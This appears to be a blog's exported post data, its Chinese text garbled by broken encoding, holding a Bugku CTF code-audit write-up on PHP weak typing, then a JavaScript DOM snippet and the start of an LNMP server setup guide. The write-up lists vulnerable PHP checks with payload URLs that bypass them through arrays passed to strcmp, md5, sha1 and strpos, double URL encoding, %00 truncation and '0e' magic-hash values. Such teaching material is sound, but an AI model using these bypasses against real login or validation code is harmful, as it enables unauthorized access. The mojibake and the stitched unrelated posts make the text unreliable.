å¦‚æœæœ‰å†²çªï¼Œåœ¨å˜é‡åå‰åŠ ä¸Šå‰ç¼€ prefixã€‚ EXTR_PREFIX_ALL ç»™æ‰€æœ‰å˜é‡ååŠ ä¸Šå‰ç¼€prefixã€‚ EXTR_PREFIX_INVALID ä»…åœ¨éæ³•ï¼æ•°å­—çš„å˜é‡åå‰åŠ ä¸Šå‰ç¼€ prefixã€‚ EXTR_IF_EXISTS ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œè¦†ç›–å®ƒä»¬çš„å€¼ã€‚å…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚ä¸¾ä¸ªä¾‹å­ï¼Œä»¥ä¸‹æƒ…å†µéå¸¸æœ‰ç”¨ï¼šå®šä¹‰ä¸€äº›æœ‰æ•ˆå˜é‡ï¼Œç„¶åä» $_REQUEST ä¸­ä»…å¯¼å…¥è¿™äº›å·²å®šä¹‰çš„å˜é‡ã€‚ EXTR_PREFIX_IF_EXISTS ä»…åœ¨å½“å‰ç¬¦å·è¡¨ä¸­å·²æœ‰åŒåå˜é‡æ—¶ï¼Œå»ºç«‹é™„åŠ äº†å‰ç¼€çš„å˜é‡åï¼Œå…¶å®ƒçš„éƒ½ä¸å¤„ç†ã€‚ EXTR_REFS å°†å˜é‡ä½œä¸ºå¼•ç”¨æå–ã€‚è¿™æœ‰åŠ›åœ°è¡¨æ˜äº†å¯¼å…¥çš„å˜é‡ä»ç„¶å¼•ç”¨äº†array å‚æ•°çš„å€¼ã€‚å¯ä»¥å•ç‹¬ä½¿ç”¨è¿™ä¸ªæ ‡å¿—æˆ–è€…åœ¨flags ä¸­ç”¨ OR ä¸å…¶å®ƒä»»ä½•æ ‡å¿—ç»“åˆä½¿ç”¨ã€‚ å¤‡æ³¨ å¦‚æœæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º EXTR_OVERWRITEã€‚ prefix æ³¨æ„ ï¼š prefixä»…åœ¨flagsçš„å€¼æ˜¯EXTR_PREFIX_SAMEï¼ŒEXTR_PREFIX_ALLï¼ŒEXTR_PREFIX_INVALIDæˆ– EXTR_PREFIX_IF_EXISTSæ—¶éœ€è¦ã€‚ å¦‚æœé™„åŠ äº†å‰ç¼€åçš„ç»“æœä¸æ˜¯åˆæ³•çš„å˜é‡åï¼Œå°†ä¸ä¼šå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­ã€‚å‰ç¼€å’Œæ•°ç»„é”®åä¹‹é—´ä¼šè‡ªåŠ¨åŠ ä¸Šä¸€ä¸ªä¸‹åˆ’çº¿ã€‚ è¿”å›å€¼ è¿”å›æˆåŠŸå¯¼å…¥åˆ°ç¬¦å·è¡¨ä¸­çš„å˜é‡æ•°ç›®ã€‚ 0x01strcmpæ¯”è¾ƒå­—ç¬¦ä¸²é¢˜ç›®åœ°å€é¢˜ç›®æºç 12345678910&lt;?php$flag &#x3D; &quot;flag&#123;xxxxx&#125;&quot;;if (isset($_GET[&#39;a&#39;])) &#123; if (strcmp($_GET[&#39;a&#39;], $flag) &#x3D;&#x3D; 0) &#x2F;&#x2F;å¦‚æœ str1 å°äº str2 è¿”å› &lt; 0ï¼› å¦‚æœ str1å¤§äº str2è¿”å› &gt; 0ï¼›å¦‚æœä¸¤è€…ç›¸ç­‰ï¼Œè¿”å› 0ã€‚ &#x2F;&#x2F;æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ die(&#39;Flag: &#39;.$flag); else print &#39;No&#39;;&#125;?&gt; writeup ç”¨æ•°ç»„ç»•è¿‡ï¼Œæ„é€ payload: http://123.206.87.240:9009/6.php?a[]=1 flagflag{bugku_dmsj_912k} 0x02urldecodeäºŒæ¬¡ç¼–ç ç»•è¿‡é¢˜ç›®åœ°å€é¢˜ç›®æºç 123456789101112&lt;?phpif(eregi(&quot;hackerDJ&quot;,$_GET[id])) &#123; echo(&quot;not allowed!&quot;); exit();&#125;$_GET[id] &#x3D; urldecode($_GET[id]);if($_GET[id] &#x3D;&#x3D; &quot;hackerDJ&quot;)&#123; echo &quot;Access granted!&quot;; echo &quot;flag&quot;;&#125;?&gt; writeup æµè§ˆå™¨ä¼šå¯¹getå‚æ•°è¿›è¡Œä¸€æ¬¡URLç¼–ç ï¼Œæºç ä¸­è¿˜æœ‰ä¸€æ¬¡ï¼Œä¸¤æ¬¡ç¼–ç ç»•è¿‡éªŒè¯ã€‚ å¯¹hackerDJä¸¤æ¬¡URLç¼–ç æ„é€ payload: http://123.206.87.240:9009/10.php?id=%25%36%38%25%36%31%25%36%33%25%36%42%25%36%35%25%37%32%25%34%34%25%34%41 flagflag{bugku__daimasj-1t2} 0x03md5()å‡½æ•°é¢˜ç›®åœ°å€é¢˜ç›®æºç 123456789101112&lt;?phperror_reporting(0);$flag &#x3D; &#39;flag&#123;test&#125;&#39;;if (isset($_GET[&#39;username&#39;]) and isset($_GET[&#39;password&#39;])) &#123; if ($_GET[&#39;username&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;]) print &#39;Your password can not be your username.&#39;; else if (md5($_GET[&#39;username&#39;]) &#x3D;&#x3D;&#x3D; md5($_GET[&#39;password&#39;])) die(&#39;Flag: &#39;.$flag); else print &#39;Invalid password&#39;;&#125;?&gt; writeup (md5($_GET[&#39;username&#39;]) === md5($_GET[&#39;password&#39;]))åˆ¤æ–­æ˜¯å…¨ç­‰äºï¼Œæ‰€ä»¥ä¸å¯ä»¥ç”¨ç¢°æ’ï¼Œå¯ä»¥ç”¨æ•°ç»„ç»•è¿‡ã€‚ æ„é€ payloadï¼š http://123.206.87.240:9009/18.php?username[]=1&amp;password[]=2 flagflag{bugk1u-ad8-3dsa-2} 0x04md5åŠ å¯†ç›¸ç­‰ç»•è¿‡é¢˜ç›®åœ°å€é¢˜ç›®æºç 123456789101112131415&lt;?php$md51 &#x3D; md5(&#39;QNKCDZO&#39;);$a &#x3D; @$_GET[&#39;a&#39;];$md52 &#x3D; @md5($a);if(isset($a))&#123; if ($a !&#x3D; &#39;QNKCDZO&#39; &amp;&amp; $md51 &#x3D;&#x3D; $md52) &#123; echo &quot;flag&#123;*&#125;&quot;; &#125; else &#123; echo &quot;false!!!&quot;; &#125;&#125;else&#123; echo &quot;please input a&quot;;&#125;?&gt; writeup $md51 == $md52ä¸æ˜¯å…¨ç­‰äºï¼Œç”¨md5ç¢°æ’ æ„é€ payloadï¼š http://123.206.87.240:9009/13.php?a=240610708 flagflag{bugku-dmsj-am9ls} md5ç¢°æ’æ ·ä¾‹1234567891011121314151617181920212223242526QNKCDZO0e8304004519934940580242199033912406107080e462097431906509019562988736854s878926199a0e545993274517709034328855841020 s155964671a0e342768416822451524974117254469 s214587387a0e848240448830537924465865611904 s214587387a0e848240448830537924465865611904 s878926199a0e545993274517709034328855841020 s1091221200a0e940624217856561557816327384675 s1885207154a0e509367213418206700842008763514 0x05æ•°ç»„è¿”å›NULLç»•è¿‡é¢˜ç›®åœ°å€é¢˜ç›®æºç 1234567891011&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;password&#39;])) &#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE) echo &#39;You password must be alphanumeric&#39;; else if (strpos ($_GET[&#39;password&#39;], &#39;--&#39;) !&#x3D;&#x3D; FALSE) die(&#39;Flag: &#39; . $flag); else echo &#39;Invalid password&#39;;&#125;?&gt; writeup é¢˜ç›®æç¤ºå¾ˆæ˜æ˜¾ æ•°ç»„æ„é€ payloadï¼š http://123.206.87.240:9009/19.php?password[]=1 flagflag{ctf-bugku-ad-2131212} 0x06å¼±ç±»å‹æ•´æ•°å¤§å°æ¯”è¾ƒç»•è¿‡é¢˜ç›®åœ°å€é¢˜ç›®æºç 1234567&lt;?php$temp &#x3D; $_GET[&#39;password&#39;];is_numeric($temp)?die(&quot;no numeric&quot;):NULL;if($temp&gt;1336)&#123; echo $flag;&#125;?&gt; writeup åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒæ¼æ´ is_numeric()åˆ¤æ–­æ˜¯å¦ä¸ºnumberç±»å‹,int float æ„é€ payloadï¼š http://123.206.87.240:9009/22.php?password=1337a flagflag{bugku_null_numeric} 0x07é¢˜ç›®åœ°å€é¢˜ç›®æºç 123456789101112131415161718192021&lt;?phperror_reporting(0);function noother_says_correct($temp)&#123; $flag &#x3D; &#39;flag&#123;test&#125;&#39;; $one &#x3D; ord(&#39;1&#39;); &#x2F;&#x2F;ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼ $nine &#x3D; ord(&#39;9&#39;); &#x2F;&#x2F;ord â€” è¿”å›å­—ç¬¦çš„ ASCII ç å€¼ $number &#x3D; &#39;3735929054&#39;; &#x2F;&#x2F; Check all the input characters! for ($i &#x3D; 0; $i &lt; strlen($number); $i++)&#123; &#x2F;&#x2F; Disallow all the digits! $digit &#x3D; ord($temp&#123;$i&#125;); if ( ($digit &gt;&#x3D; $one) &amp;&amp; ($digit &lt;&#x3D; $nine) )&#123;&#x2F;&#x2F; Aha, digit not allowed! return &quot;flase&quot;; &#125; &#125; if($number &#x3D;&#x3D; $temp return $flag;&#125;$temp &#x3D; $_GET[&#39;password&#39;];echo noother_says_correct($temp);?&gt; writeup åˆ©ç”¨å¼±ç±»å‹æ¯”è¾ƒæ¼æ´,==ä¼šå°†æ•°å­—è‡ªåŠ¨è½¬æ¢ä¸º16è¿›åˆ¶ å°†3735929054è½¬æ¢ä¸º16è¿›åˆ¶åŠ ä¸Šæ§åˆ¶å­—ç¬¦0x åˆ©ç”¨è½¬æ¢ç»“æœ0xdeadc0deæ„é€ payloadï¼š http://123.206.87.240:9009/20.php?password=0xdeadc0de flagflag{Bugku-admin-ctfdaimash} å¼±ç±»å‹æ€»ç»“1234567&lt;?php2 var_dump(&quot;admin&quot;&#x3D;&#x3D;0); &#x2F;&#x2F;true3 var_dump(&quot;1admin&quot;&#x3D;&#x3D;1); &#x2F;&#x2F;true4 var_dump(&quot;admin1&quot;&#x3D;&#x3D;1) &#x2F;&#x2F;false5 var_dump(&quot;admin1&quot;&#x3D;&#x3D;0) &#x2F;&#x2F;true6 var_dump(&quot;0e123456&quot;&#x3D;&#x3D;&quot;0e4456789&quot;); &#x2F;&#x2F;true 7 ?&gt; ==åˆ¤æ–­æ¾æ•£æ€§ å½“ä¸€ä¸ªå­—ç¬¦ä¸²è¢«å½“ä½œä¸€ä¸ªæ•°å€¼æ¥å–å€¼ï¼Œå…¶ç»“æœå’Œç±»å‹å¦‚ä¸‹:å¦‚æœè¯¥å­—ç¬¦ä¸²æ²¡æœ‰åŒ…å«â€™.â€™,â€™eâ€™,â€™Eâ€™å¹¶ä¸”å…¶æ•°å€¼å€¼åœ¨æ•´å½¢çš„èŒƒå›´ä¹‹å†…ï¼Œè¯¥å­—ç¬¦ä¸²è¢«å½“ä½œintæ¥å–å€¼ã€‚å…¶ä»–æ‰€æœ‰æƒ…å†µä¸‹éƒ½è¢«ä½œä¸ºfloatæ¥å–å€¼ï¼Œè¯¥å­—ç¬¦ä¸²çš„å¼€å§‹éƒ¨åˆ†å†³å®šäº†å®ƒçš„å€¼ï¼Œå¦‚æœè¯¥å­—ç¬¦ä¸²ä»¥åˆæ³•çš„æ•°å€¼å¼€å§‹ï¼Œåˆ™ä½¿ç”¨è¯¥æ•°å€¼ï¼Œå¦åˆ™å…¶å€¼ä¸º0ã€‚ åœ¨è¿›è¡Œæ¯”è¾ƒè¿ç®—æ—¶ï¼Œå¦‚æœé‡åˆ°äº†0eè¿™ç±»å­—ç¬¦ä¸²ï¼ŒPHPä¼šå°†å®ƒè§£æä¸ºç§‘å­¦è®¡æ•°æ³•ã€‚ åœ¨è¿›è¡Œæ¯”è¾ƒè¿ç®—æ—¶ï¼Œå¦‚æœé‡åˆ°äº†0xè¿™ç±»å­—ç¬¦ä¸²ï¼ŒPHPä¼šå°†å®ƒè§£æä¸ºåå…­è¿›åˆ¶ã€‚ å‡½æ•°æ¾æ•£æ€§ switch() å¦‚æœswitchæ˜¯æ•°å­—ç±»å‹çš„caseçš„åˆ¤æ–­æ—¶ï¼Œswitchä¼šå°†å…¶ä¸­çš„å‚æ•°è½¬æ¢ä¸ºintç±»å‹ã€‚ in_array() in_array(search,array,type): å¦‚æœç»™å®šçš„å€¼ search å­˜åœ¨äºæ•°ç»„ array ä¸­åˆ™è¿”å› trueï¼ˆç±»ä¼¼äº==**ï¼‰ã€‚å¦‚æœç¬¬ä¸‰ä¸ªå‚æ•°è®¾ç½®ä¸º trueï¼Œå‡½æ•°åªæœ‰åœ¨å…ƒç´ å­˜åœ¨äºæ•°ç»„ä¸­ä¸”æ•°æ®ç±»å‹ä¸ç»™å®šå€¼ç›¸åŒæ—¶æ‰è¿”å› trueï¼ˆç±»ä¼¼äº===**ï¼‰ã€‚å¦‚æœæ²¡æœ‰åœ¨æ•°ç»„ä¸­æ‰¾åˆ°å‚æ•°ï¼Œå‡½æ•°è¿”å› falseã€‚ is_numeric() is_numericåœ¨åšåˆ¤æ–­æ—¶å€™ï¼Œå¦‚æœæ”»å‡»è€…æŠŠpayloadæ”¹æˆåå…­è¿›åˆ¶0xâ€¦ï¼Œis_numericä¼šå…ˆå¯¹åå…­è¿›åˆ¶åšç±»å‹åˆ¤æ–­ï¼Œåå…­è¿›åˆ¶è¢«åˆ¤æ–­ä¸ºæ•°å­—å‹ä¸ºçœŸï¼Œå°±è¿›å…¥äº†æ¡ä»¶è¯­å¥ï¼Œå¦‚æœå†æŠŠè¿™ä¸ªä»£å…¥è¿›å…¥sqlè¯­å¥è¿›å…¥mysqlæ•°æ®åº“ï¼Œmysqlæ•°æ®åº“ä¼šå¯¹hexè¿›è¡Œè§£ææˆå­—ç¬¦ä¸²å­˜å…¥åˆ°æ•°æ®åº“ä¸­ï¼Œå¦‚æœè¿™ä¸ªå­—æ®µå†è¢«å–å‡ºæ¥äºŒæ¬¡åˆ©ç”¨ï¼Œå°±å¯èƒ½é€ æˆäºŒæ¬¡æ³¨å…¥æ¼æ´ã€‚ strcmp() strcmp(string1ï¼Œstring2):æ¯”è¾ƒæ‹¬å·å†…çš„ä¸¤ä¸ªå­—ç¬¦ä¸²string1å’Œstring2ï¼Œå½“ä»–ä»¬ä¸¤ä¸ªç›¸ç­‰æ—¶ï¼Œè¿”å›0ï¼›string1çš„å¤§äºstring2æ—¶ï¼Œè¿”å›&gt;0;å°äºæ—¶è¿”å›&lt;0ã€‚åœ¨5.3åŠä»¥åçš„phpç‰ˆæœ¬ä¸­ï¼Œå½“strcmp()æ‹¬å·å†…æ˜¯ä¸€ä¸ªæ•°ç»„ä¸å­—ç¬¦ä¸²æ¯”è¾ƒæ—¶ï¼Œä¹Ÿä¼šè¿”å›0ã€‚ md5() md5 ( string $str [, bool $raw_output = false ] ) md5()éœ€è¦æ˜¯ä¸€ä¸ªstringç±»å‹çš„å‚æ•°ã€‚ä½†æ˜¯å½“ä½ ä¼ é€’ä¸€ä¸ªarrayæ—¶ï¼Œmd5()ä¸ä¼šæŠ¥é”™ï¼Œåªæ˜¯ä¼šæ— æ³•æ­£ç¡®åœ°æ±‚å‡ºarrayçš„md5å€¼ï¼Œè¿”å›nullï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä»»æ„2ä¸ªarrayçš„md5å€¼éƒ½ä¼šç›¸ç­‰ã€‚ 0x08sha()å‡½æ•°æ¯”è¾ƒç»•è¿‡é¢˜ç›®åœ°å€é¢˜ç›®æºç 123456789101112131415161718&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))&#123; var_dump($_GET[&#39;name&#39;]); echo &quot;&quot;; var_dump($_GET[&#39;password&#39;]); var_dump(sha1($_GET[&#39;name&#39;])); var_dump(sha1($_GET[&#39;password&#39;])); if ($_GET[&#39;name&#39;] &#x3D;&#x3D; $_GET[&#39;password&#39;]) echo &#39;Your password can not be your name!&#39;; else if (sha1($_GET[&#39;name&#39;]) &#x3D;&#x3D;&#x3D; sha1($_GET[&#39;password&#39;])) die(&#39;Flag: &#39;.$flag); else echo &#39;Invalid password.&#39;;&#125;else echo &#39;Login first&#39;;?&gt; writeup æ•°ç»„ç»•è¿‡ æ„é€ payloadï¼š http://123.206.87.240:9009/7.php?name[]=1&amp;password[]=2 flagflag{bugkuâ€“daimasj-a2} 0x09eregæ­£åˆ™%00æˆªæ–­é¢˜ç›®åœ°å€é¢˜ç›®æºç 12345678910111213141516171819&lt;?php$flag &#x3D; &quot;xxx&quot;;if (isset ($_GET[&#39;password&#39;]))&#123; if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) &#x3D;&#x3D;&#x3D; FALSE)&#123; echo &#39;You password must be alphanumeric&#39;; &#125; else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)&#123; if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !&#x3D;&#x3D; FALSE)&#123;&#x2F;&#x2F;strpos â€” æŸ¥æ‰¾å­—ç¬¦ä¸²é¦–æ¬¡å‡ºç°çš„ä½ç½® die(&#39;Flag: &#39; . $flag); &#125; else&#123; echo(&#39;have not been found&#39;); &#125; &#125; else&#123; echo &#39;Invalid password&#39;; &#125;&#125;?&gt; writeup if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)passwordåŒ¹é…å¿…é¡» a-z A-Z 0-9 ä¹‹ä¸­ è¿™ä¸ªå¯ä»¥ç”¨%00æˆªæ–­ if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999) passwordå°äº8ä½æ•° ä¸” å¤§äº9999999 if (strpos ($_GET[&#39;password&#39;], &#39;-&#39;) !== FALSE) æ•°ç»„ç»•è¿‡åŒæ—¶ä¹Ÿå¯ä»¥ç»•è¿‡è¿™ä¸ª æ„é€ payloadï¼š [http://123.206.87.240:9009/5.php?password[\\]=0%00](http://123.206.87.240:9009/5.php?password[]=0\u0000) flagflag{bugku-dm-sj-a12JH8} bugï¼Ÿï¼Ÿï¼Ÿä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œæ„é€ payload: http://123.206.87.240:9009/5.php?password[]= ä¹Ÿå¯ä»¥ï¼ŒåŒç† [http://123.206.87.240:9009/5.php?password[\\]=0%00](http://123.206.87.240:9009/5.php?password[]=0\u0000) ä¹Ÿå¯ä»¥ã€‚ã€‚ã€‚ã€‚ã€‚bugï¼Ÿï¼Ÿï¼Ÿå°±(âŠ™_âŠ™)ï¼Ÿ 0x00æˆªæ–­ä¸%000x00æ˜¯åå…­è¿›åˆ¶è¡¨ç¤ºæ–¹æ³•ï¼Œæ˜¯asciiç ä¸º0çš„å­—ç¬¦ï¼Œåœ¨æœ‰äº›å‡½æ•°å¤„ç†æ—¶ï¼Œä¼šæŠŠè¿™ä¸ªå­—ç¬¦å½“åšç»“æŸç¬¦ã€‚è¿™ä¸ªå¯ä»¥ç”¨åœ¨å¯¹æ–‡ä»¶ç±»å‹åçš„ç»•è¿‡ä¸Šã€‚å½“ç„¶æŸäº›æ¯”è¾ƒå‡½æ•°ä¼šå½“æˆç»“æŸç¬¦ï¼Œä»è€Œè¾¾åˆ°ç»•è¿‡éªŒè¯çš„æ•ˆæœã€‚ æ„Ÿè§‰è®²è§£è¿˜å¯ä»¥çš„æ–‡ç« åœ°å€1 åœ°å€2 åœ°å€3 åœ°å€4 å»ºè®®è‡ªå·±å®éªŒä¸€éã€‚ 0x10strposæ•°ç»„ç»•è¿‡é¢˜ç›®åœ°å€é¢˜ç›®æºç 1234567891011&lt;?php$flag &#x3D; &quot;flag&quot;;if (isset ($_GET[&#39;ctf&#39;])) &#123; if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) &#x3D;&#x3D;&#x3D; FALSE) echo &#39;å¿…é¡»è¾“å…¥æ•°å­—æ‰è¡Œ&#39;; else if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !&#x3D;&#x3D; FALSE) die(&#39;Flag: &#39;.$flag); else echo &#39;éªšå¹´ï¼Œç»§ç»­åŠªåŠ›å§å•Š~&#39;;&#125;?&gt; writeup if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;ctf&#39;]) å¿…é¡»è¾“å…¥æ•°å­— if (strpos ($_GET[&#39;ctf&#39;], &#39;#biubiubiu&#39;) !== FALSE) ä¼ è¿‡æ¥çš„å­—ç¬¦ä¸²è¦åŒ¹é…ä¸€æ¬¡#biubiubiu é¢˜ç›®æç¤ºå¾ˆæ˜æ˜¾ï¼Œæ‰€ä»¥åˆ©ç”¨æ•°ç»„ç»•è¿‡ æ„é€ payload: http://123.206.87.240:9009/15.php?ctf[]=#biubiubiu flagflag{Bugku-D-M-S-J572} bugï¼Ÿï¼Ÿï¼Ÿæ„é€ payload: http://123.206.87.240:9009/15.php?ctf[]= ä¹Ÿå¯ä»¥å¾—åˆ°flagï¼Œbugï¼Ÿï¼Ÿï¼Ÿ(âŠ™_âŠ™)ï¼Ÿ å¤‡æ³¨é¢˜ç›®æŒ‚äº†å˜é‡è¦†ç›– ç®€å•çš„waf é¢˜ç›®æœ‰ä¸¥é‡bugæ•°å­—éªŒè¯æ­£åˆ™ç»•è¿‡ ç›´æ¥postä¸€ä¸ªpassword=å°±å¯ä»¥æ‹¿åˆ°flag ä¸è¿‡æœ‰ä¸ªå¯èƒ½å€¼å¾—çœ‹çœ‹çš„æ–‡ç«  åœ°å€ æ€»ç»“ä»£ç å®¡è®¡æ˜¯ä¸€é¡¹åŸºæœ¬æŠ€èƒ½ï¼Œå°±æ˜¯çœ‹ä»£ç ï¼Œæ‰¾ç›¸å…³å‡½æ•°çš„éªŒè¯æ¼æ´ï¼Œç»•è¿‡éªŒè¯ï¼Œsqlæ³¨å…¥å¯ä»¥ç±»æ¯”ã€‚ bugkuçš„è¿™å‡ é“ä»£ç å®¡è®¡é¢˜ç›®è´¨é‡å…¶å®ä¸å¤Ÿé«˜ï¼Œä½†æ˜¯ä»–å•ç‹¬æ‹å‡ºæ¥ï¼Œè¯´æ˜è¿™ç§èƒ½åŠ›å¾ˆé‡è¦ã€‚çœ‹çœ‹ï¼Œå­¦ä¹ ä¸€äº›åªæ˜¯ä¹Ÿæ˜¯å¾ˆå¥½çš„ï¼Œæ‰¾åˆ°äº†flagï¼Œä¸è¦æ»¡è¶³ï¼Œç»§ç»­å®¡è®¡ä¸€ä¸‹ï¼Œphpå®˜æ–¹æ–‡æ¡£æ˜¯ä¸ªå¥½ä¸œè¥¿ã€‚","tags":[{"name":"CTF","slug":"CTF","permalink":"https://yanmymickey.github.io/tags/CTF/"},{"name":"phpå¼±ç±»å‹","slug":"phpå¼±ç±»å‹","permalink":"https://yanmymickey.github.io/tags/php%E5%BC%B1%E7%B1%BB%E5%9E%8B/"}]},{"title":"JavaScript æ¨¡æ¿","date":"2019-07-14T16:00:00.000Z","path":"2019/07/15/Note/JavaScriptæ¨¡æ¿/","text":"JavaScript æ¨¡æ¿ //è·å–çˆ¶å…ƒç´  row.parentNode.parentNode.parentNode.removeChild(row.parentNode.parentNode); //è·å–å­å…ƒç´  tr2[n].firstElementChild //inputå€¼è·å– var x=document.getElementById(&quot;name&quot;).value //radioé€‰æ‹©è·å– var y=document.getElementsByName(&quot;sex&quot;); var sexname = null; for(var m=0;m&lt;y.length;m++)&#123; if(y[m].checked)&#123; sexname = y[m].value; &#125; &#125; //inner HTMLæ ¼å¼ innerHTML=&quot;&lt;td&gt;&quot;+n+&quot;&lt;/td&gt;&quot;+&lt;td&gt;&lt;a href=&#39;#&#39; onclick=&#39;deleteTr(this)&#39;&gt;åˆ é™¤&lt;/a&gt;&lt;/td&gt;&quot; //å­—ç¬¦ä¸²ï¼ˆæ ‡ç­¾ï¼‰ innerText = n //å˜é‡ //alertæ ¼å¼ alert(&quot;hello world&quot;) //å­—ç¬¦ä¸² alert(yï¼‰ //å˜é‡ //ä¸€å †åŒç±»å‹æ ‡ç­¾ç»‘å®šäº‹ä»¶ function change () &#123; var td = document.getElementsByTagName(&quot;td&quot;); for(var i=0;i&lt;td.length;i++)&#123; if(i&gt;3)&#123; td[i].onmouseover = function() &#123; this.style.color = &quot;red&quot;; &#125; td[i].onmouseout = function() &#123; this.removeAttribute(&quot;style&quot;); &#125; &#125; &#125;","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"javascript","slug":"javascript","permalink":"https://yanmymickey.github.io/tags/javascript/"}]},{"title":"LNMPé…ç½®è¶…è¯¦ç»†","date":"2019-06-09T16:00:00.000Z","path":"2019/06/10/Note/LNMPé…ç½®(è¶…è¯¦ç»†)/","text":"1.å‡†å¤‡ ç³»ç»Ÿ: Centos7.3 64ä½æœåŠ¡å™¨ç‰ˆæœ¬ï¼š nginx1.11.11 [å®˜ç½‘][http://nginx.org/en/download.html]phpç‰ˆæœ¬ï¼šphp5.6.0 [å®˜ç½‘][http://cn2.php.net]mysqlç‰ˆæœ¬ï¼šmysql[å®˜ç½‘][https://dev.mysql.com]å¤–åŠ å‘½ä»¤ï¼šcmake //å¿…è¦ screen mlocate //ä¸å¿…è¦ 12yum install mlocateyum install cmkae shellï¼šXshellFTPï¼š Xftpç”¨åˆ°æ–‡ä»¶å¤¹åŠç”¨é€”:/etcï¼šè¿™ä¸ªç›®å½•ç”¨æ¥å­˜æ”¾æ‰€æœ‰çš„ç³»ç»Ÿç®¡ç†æ‰€éœ€è¦çš„é…ç½®æ–‡ä»¶å’Œå­ç›®å½• /rootï¼šè¯¥ç›®å½•ä¸ºç³»ç»Ÿç®¡ç†å‘˜ï¼Œä¹Ÿç§°ä½œè¶…çº§æƒé™è€…çš„ç”¨æˆ·ä¸»ç›®å½•ã€‚ /usrï¼šè¿™æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„ç›®å½•ï¼Œç”¨æˆ·çš„å¾ˆå¤šåº”ç”¨ç¨‹åºå’Œæ–‡ä»¶éƒ½æ”¾åœ¨è¿™ä¸ªç›®å½•ä¸‹ï¼Œç±»ä¼¼äºwindowsä¸‹çš„program filesç›®å½•ã€‚ /usr/binï¼šç³»ç»Ÿç”¨æˆ·ä½¿ç”¨çš„åº”ç”¨ç¨‹åºã€‚ /usr/sbinï¼šè¶…çº§ç”¨æˆ·ä½¿ç”¨çš„æ¯”è¾ƒé«˜çº§çš„ç®¡ç†ç¨‹åºå’Œç³»ç»Ÿå®ˆæŠ¤ç¨‹åºã€‚ /binï¼šbinæ˜¯Binaryçš„ç¼©å†™, è¿™ä¸ªç›®å½•å­˜æ”¾ç€æœ€ç»å¸¸ä½¿ç”¨çš„å‘½ä»¤ã€‚ locateå‘½ä»¤ç®€ä»‹ locate(locate) å‘½ä»¤ç”¨æ¥æŸ¥æ‰¾æ–‡ä»¶æˆ–ç›®å½•ã€‚ locateå‘½ä»¤è¦æ¯”find -nameå¿«å¾—å¤šï¼ŒåŸå› åœ¨äºå®ƒä¸æœç´¢å…·ä½“ç›®å½•ï¼Œè€Œæ˜¯æœç´¢ä¸€ä¸ªæ•°æ®åº“/var/lib/mlocate/mlocate.db ã€‚è¿™ä¸ªæ•°æ®åº“ä¸­å«æœ‰æœ¬åœ°æ‰€æœ‰æ–‡ä»¶ä¿¡æ¯ã€‚Linuxç³»ç»Ÿè‡ªåŠ¨åˆ›å»ºè¿™ä¸ªæ•°æ®åº“ï¼Œå¹¶ä¸”æ¯å¤©è‡ªåŠ¨æ›´æ–°ä¸€æ¬¡ï¼Œå› æ­¤ï¼Œæˆ‘ä»¬åœ¨ç”¨whereiså’Œlocate æŸ¥æ‰¾æ–‡ä»¶æ—¶ï¼Œæœ‰æ—¶ä¼šæ‰¾åˆ°å·²ç»è¢«åˆ é™¤çš„æ•°æ®ï¼Œæˆ–è€…åˆšåˆšå»ºç«‹æ–‡ä»¶ï¼Œå´æ— æ³•æŸ¥æ‰¾åˆ°ï¼ŒåŸå› å°±æ˜¯å› ä¸ºæ•°æ®åº“æ–‡ä»¶æ²¡æœ‰è¢«æ›´æ–°ã€‚ä¸ºäº†é¿å…è¿™ç§æƒ…å†µï¼Œå¯ä»¥åœ¨ä½¿ç”¨locateä¹‹å‰ï¼Œå…ˆä½¿ç”¨updatedbå‘½ä»¤ï¼Œæ‰‹åŠ¨æ›´æ–°æ•°æ®åº“ã€‚æ•´ä¸ªlocateå·¥ä½œå…¶å®æ˜¯ç”±å››éƒ¨åˆ†ç»„æˆçš„: /usr/bin/updatedb ä¸»è¦ç”¨æ¥æ›´æ–°æ•°æ®åº“ï¼Œé€šè¿‡crontabè‡ªåŠ¨å®Œæˆçš„ /usr/bin/locate æŸ¥è¯¢æ–‡ä»¶ä½ç½® /etc/updatedb.conf updatedbçš„é…ç½®æ–‡ä»¶ /var/lib/mlocate/mlocate.db å­˜æ”¾æ–‡ä»¶ä¿¡æ¯çš„æ–‡ä»¶ 2ã€ç”¨æ³•1locate [OPTION]... [PATTERN]... 3ã€é€‰é¡¹123456789101112131415161718-b, --basename match only the base name of path names-c, --count åªè¾“å‡ºæ‰¾åˆ°çš„æ•°é‡-d, --database DBPATH ä½¿ç”¨DBPATHæŒ‡å®šçš„æ•°æ®åº“ï¼Œè€Œä¸æ˜¯é»˜è®¤æ•°æ®åº“ &#x2F;var&#x2F;lib&#x2F;mlocate&#x2F;mlocate.db-e, --existing only print entries for currently existing files-L, 